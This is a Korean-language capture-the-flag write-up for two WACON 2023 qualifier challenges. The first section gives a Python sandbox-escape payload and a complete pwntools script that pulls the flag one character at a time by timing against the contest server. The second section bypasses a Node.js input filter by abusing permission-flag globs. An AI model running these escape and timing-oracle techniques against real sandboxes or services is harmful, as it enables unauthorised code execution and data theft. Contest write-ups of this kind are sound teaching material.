# WACON 2023 Prequal Writeup

## ScavengerHunt [misc]

Pyjail 문제에 seccomp 필터를 얹은 문제이다. 허용되는 syscall은 `exit` 등 파이썬 인터프리터가 종료될 때 사용하는 것이나 `brk` 밖에 없기 때문에 출력이고 뭐고 할 수 없다. 플래그는 `secret.py`라는 모듈에 있는 엄청 긴 변수에 저장되어 있다.

우선 플래그를 출력하는 것은 둘째치고, value를 가져오는것부터 해보자. 엄청 긴 변수의 이름도 blind sqli 마냥 가져올 수도 있겠지만, 변수 값에 접근할 수 있기 때문에 굳이 그럴 필요는 없을 것이다. `vars` 함수를 사용해 `secret` 모듈에 있는 변수들을 모두 가져온 다음, 값이 `WACON2023`으로 시작하는 것을 뽑으면 된다. 일반적인 상황에서는 이렇게 코딩했을 것이다.

```python
list(filter(lambda s: str(s).startswith("WACON2023"), vars(__import__("secret")).values()))[0]
```

하지만 이 문제에서는 builtin을 다 날려놓았기 때문에, 일반적인 pyjail trick을 사용해 우회해야 한다.

```python
[a:=().__class__.__base__.__subclasses__()[-1].__init__.__globals__][0]["__builtins__"]["list"](a["__builtins__"]["filter"](lambda s: ().__class__.__base__.__subclasses__()[-1].__init__.__globals__["__builtins__"]["str"](s).startswith("WACON2023"),a["__builtins__"]["vars"](a["__builtins__"]["__import__"]("secret")).values()))[0]
```

정말 안타깝게도 `lambda` 내부에서는 walrus 연산자로 생성한 변수가 capture되지 않는지, 코드가 좀 길어졌다.

이제 이 값을 어떻게든 출력해야 한다. exit code를 알 수 있는 상황이라면 맘편하게 exit할수 있겠지만, `nc` 환경이기에 알 방법이 없다. Blind SQL injection마냥, 주어진 인덱스의 문자를 다른 문자와 비교하여 작다면 무한 루프를, 그렇지 않다면 종료하는 코드를 실행시키는 방법을 사용하있다. 계속 connection을 수행하면서 코드 입력 후 2초 이상 걸린다면 무한 루프로 판정하고, 그렇지 않다면 바로 종료한 것으로 판정하여 플래그를 얻을 수 있었다. 구현한 코드는 다음과 같다.

```python
import string
import time

import pwn

CHARSET = list(sorted(string.printable))

prefix = input("prefix: ").strip()

while True:
    lo = 0
    hi = len(CHARSET)
    mid = 0
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        ch = CHARSET[mid]
        flag_candidate = prefix + ch
        cmp_formatted = f'''[a:=().__class__.__base__.__subclasses__()[-1].__init__.__globals__][0]["__builtins__"]["list"](a["__builtins__"]["filter"](lambda s: ().__class__.__base__.__subclasses__()[-1].__init__.__globals__["__builtins__"]["str"](s).startswith("WACON2023"),a["__builtins__"]["vars"](a["__builtins__"]["__import__"]("secret")).values()))[0][{len(prefix)+10}] < "{ch}"'''
        payload_formatted = f"""[a:=().__class__.__base__.__subclasses__()[-1].__init__.__globals__][0]['__builtins__']['exec']('if {cmp_formatted}:\\n  while True: pass\\nelse: exit()')"""
        io = pwn.remote("1.234.10.246", "55555")
        io.recvline()

        pwn.info(f"Trying: {flag_candidate}")
        io.sendline(payload_formatted.encode())

        start = time.time()
        io.recvall(timeout=4)
        end = time.time()

        if end - start >= 2:
            pwn.info(f"LT")
            hi = mid
        else:
            pwn.info("GT")
            lo = mid

    prefix += CHARSET[lo]
    pwn.info(f"Current flag: {prefix}")
```

Flag: `WACON2023{91d9cec468a8b22b57c2b091beb64bcc}`

## Web? [misc]

Node.js v20의 채신기술 permission을 사용한 문제이다. `/calc` 엔드포인트로 `expr`과 `opt`를 POST해주면 `eval.js`를 `opt`를 `node` 바이너리에 CLI arg로 주고, `expr`을 실행시킨다.

문제는 `eval.js`에 필터가 있다는 점이다. `/[^\+|\*|-|%|\/|\d+|0-9]/`에 한 글자라도 걸리면 실행해 주지 않는데, 사실상 필터에 걸리지 않는 것으로는 할 수 있는 것이 없다. `eval.js`를 들여다보면 여기서 힌트를 얻을 수 있다.

```javascript
let filter = null;
try {
  	filter = fs.readFileSync("config").toString();
} catch {}
```

`config` 파일을 읽는데 실패한다면, 필터를 무력화할 수 있다. `main.js`에도 나와 있었지만, `--allow-fs-read` 플래그를 사용하면 읽을 수 있는 파일을 제한할 수 있다. 따라서 `opt`에 `--allow-fs-read=/flag.txt,/app/main.js`를 주고, 플래그를 읽어서 출력하는 코드를 주어서 실행하면 된다... 일 줄 알았으나 `opt`는 `/^--[A-Za-z|,|\/|\*|\=|\-]+$/`로 검사하기 때문에 그렇게 되지 않는다. `*`이 허용되기 때문에, `--allow-fs-read=/flag*,/app/main*`을 대신 사용하자.

Flag: `WACON2023{9fd79a4784869ba4873aee15c94f15281fa0e26c606e0da6f34f158f46f40889}`